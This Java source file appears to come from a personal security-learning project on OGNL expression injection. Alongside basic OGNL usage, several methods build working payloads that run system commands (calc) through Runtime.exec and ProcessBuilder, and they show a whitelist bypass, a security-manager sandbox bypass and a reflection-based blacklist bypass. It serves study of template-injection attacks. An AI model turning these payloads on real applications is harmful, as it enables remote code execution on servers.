package com.pinger.javasec.ssti.ognl;

import com.pinger.javasec.ssti.ognl.pojo.Address;
import com.pinger.javasec.ssti.ognl.pojo.User;
import ognl.DefaultMemberAccess;
import ognl.Node;
import ognl.Ognl;
import ognl.OgnlContext;
import org.yaml.snakeyaml.Yaml;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.lang.reflect.Method;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author : p1n93r
 * @date : 2021/9/14 9:45
 * Ognl 基础学习
 */
public class BasicLearn {


    /**
     * 测试访问root对象
     */
    public static void testAccessRoot()throws Exception{
        User user = new User();
        user.setAge(22);
        user.setName("p1n93r");
        Address address = new Address();
        address.setProvince("湖南");
        address.setCity("常德");
        user.setAddress(address);
        System.out.println("name = "+Ognl.getValue("name", user));
        System.out.println("age = "+Ognl.getValue("age", user));
        // ognl支持链式调用
        System.out.println("address = "+Ognl.getValue("address.province", user));
    }


    /**
     * 测试访问context
     */
    public static void testAccessContext()throws Exception{
        User rootUser = new User();
        rootUser.setName("rootUser");
        User contextUser = new User();
        contextUser.setName("contextUser");
        Map<String, Object> context = new HashMap<>(2);
        context.put("init", "hello");
        context.put("contextUser", contextUser);
        String express = "#contextUser.name";
        String express1 = "#init";
        Object value = Ognl.getValue(express, context, rootUser);
        Object value1 = Ognl.getValue(express1, context, rootUser);
        System.out.println(express+" = "+value);
        System.out.println(express1+" = "+value1);
    }


    /**
     * 测试访问静态变量和静态方法
     */
    public static void testAccessStatic()throws Exception{
        String[] expressions = {
                "@java.lang.System@out.println(\"hello,I'm an static method access test\")",
                "@java.lang.Integer@MAX_VALUE",
                "@java.lang.Runtime@getRuntime().exec(\"calc\")"
        };
        for (String express : expressions) {
            Object value = Ognl.getValue(express, null);
            System.out.println(express+" = "+value);
        }
    }

    /**
     * 测试访问context或者root对象中的方法
     */
    public static void testAccessMethod()throws Exception{
        User rootUser = new User();
        User contextUser = new User();
        Map<String, Object> context = new HashMap<>(2);
        context.put("username", "p1n93r");
        context.put("contextUser", contextUser);
        String[] expressions = {
                "setName(#username)",
                "#contextUser.setName('contextUser')",
        };
        System.out.println("rootUser = "+rootUser);
        System.out.println("contextUser = "+contextUser);
        System.out.println(":::::::::::::::::::::::::::::");
        for (String express : expressions) {
            Object value = Ognl.getValue(express,context,rootUser);
            System.out.println(express+" = "+value);
        }
        System.out.println(":::::::::::::::::::::::::::::");
        System.out.println("rootUser = "+rootUser);
        System.out.println("contextUser = "+contextUser);
    }

    /**
     * 测试访问数组和集合
     */
    public static void testAccessCollections()throws Exception{
        Map<String, Object> context = new HashMap<>();
        String[] strings  = {"str-aa", "str-bb"};
        ArrayList<String> list = new ArrayList<>();
        list.add("list-aa");
        list.add("list-bb");
        Map<String, String> map = new HashMap<>();
        map.put("key1", "value1");
        map.put("key2", "value2");
        context.put("list", list);
        context.put("strings", strings);
        context.put("map", map);
        User user = new User();
        String[] expressions = {
                "#strings[0]",
                "#list[0]",
                "#list[0 + 1]",
                "#map['key1']",
                "#map['key' + '2']"
        };
        for (String express : expressions) {
            Object value = Ognl.getValue(express,context, user);
            System.out.println(express+" = "+value);
        }
    }


    /**
     * 测试投影和选择
     */
    public static void testSelection()throws Exception{
        User p1 = new User("name1", 11,null);
        User p2 = new User("name2", 22,null);
        User p3 = new User("name3", 33,null);
        User p4 = new User("name4", 44,null);
        Map<String, Object> context = new HashMap<>();
        ArrayList<User> list = new ArrayList<>();
        list.add(p1);
        list.add(p2);
        list.add(p3);
        list.add(p4);
        context.put("list", list);
        String[] expressions = {
                "#list.{age}",
                "#list.{age + '-' + name}",
                "#list.{? #this.age > 22}",
                "#list.{^ #this.age > 22}",
                "#list.{$ #this.age > 22}"
        };
        for (String express : expressions) {
            Object value = Ognl.getValue(express,context, new User());
            System.out.println(express+" = "+value);
        }
    }

    /**
     * 测试创建对象
     */
    public static void testCreateObject()throws Exception{
        String[] expressions = {
                "#{'key1':'val1','key2':'val2'}",
                "{1,2,3,4}",
                "(new java.lang.ProcessBuilder(new java.lang.String[]{'calc'})).start()",
        };
        for (String express : expressions) {
            Object value = Ognl.getValue(express,new User());
            System.out.println(express+" = "+value);
        }
    }


    /**
     * 测试ExpressionEvaluation特性
     */
    public static void testExpressionEvaluation()throws Exception{
        // 绕过白名单检查，先讲恶意的Ognl表达式放入Ognl的上下文中
        String one="@java.lang.Runtime@getRuntime().exec('calc')";
        OgnlContext context = new OgnlContext();
        context.put("one",one);
        context.put("two","twotow");
        String attackStr="(#one)(#two)";
        Object value = Ognl.getValue(attackStr, context,"");
        System.out.println(value);
    }


    /**
     * 测试沙箱绕过
     */
    public static void fuckOgnl()throws Exception{
        System.setProperty("ognl.security.manager","true");
        OgnlContext context = new OgnlContext();
        HashMap<String, Object> rootMap = new HashMap<>(1);
        rootMap.put("test","@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.setAllowPackageProtectedAccess(true),#cmd=new String[]{'calc'},@java.lang.ProcessImpl@start(#cmd,null,null,null,false)");
        context.setRoot(rootMap);
        String express = "(test)('fuckOgnl')";
        Ognl.getValue(express,context, context.getRoot());
    }


    /**
     * 测试 Ognl Expression Blacklist 绕过
     */
    public static void testForFun()throws Exception{
//        System.setProperty("ognl.security.manager","true");
//        OgnlContext context = new OgnlContext();
//        HashMap<String, Object> hashMap = new HashMap<>();
//        hashMap.put("test","@java.lang.Runtime@getRuntime().exec('calc')");
//        context.setRoot(hashMap);
//        String attackStr="(test)(1)";
//        Object value = Ognl.getValue(attackStr, context,context.getRoot());
//        System.out.println(value);



//        System.setProperty("ognl.security.manager","true");
        OgnlContext context = new OgnlContext();
        HashMap<String, Object> hashMap = new HashMap<>();
        hashMap.put("test","(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,'calc'))");
        context.setRoot(hashMap);
        String attackStr="(test)(1)";
        Object value = Ognl.getValue(attackStr, context,context.getRoot());
        System.out.println(value);
    }


    public static void testForFun1()throws Exception{
        Map<String, Object> context = new HashMap<>(2);
        context.put("init", "hello");
        // 'fuckOgnl\u0027+{1 1}+\u0027fuckOgnl'
//        String express1 = "{\"\"['class'].forName('java.lang.Runtime')}";
        String express1 = "{#this.getClass()}";
        Node node =(Node) Ognl.parseExpression(express1);
        System.out.println("==============");
        System.out.println(node.getClass().getName());
        System.out.println(node.toString());
        for(int i = 0; i < node.jjtGetNumChildren(); ++i) {
            Node childNode = node.jjtGetChild(i);
            System.out.println("存在子节点");
            System.out.println(childNode.getClass().getName());
            System.out.println(childNode.toString());
        }
        System.out.println("==============");
        Object value1 = Ognl.getValue(express1, context, 1);
        System.out.println(express1+" = "+value1);
    }


    public static void testForFun2()throws Exception{
        Map<String, Object> context = new HashMap<>(2);
        context.put("init.test", "hello");
        String express = "#['init.test']";
        Object value1 = Ognl.getValue(express, context, 1);
        System.out.println(express+" = "+value1);
    }


    public static void main(String[] args) throws Exception{
        testForFun2();
    }


}
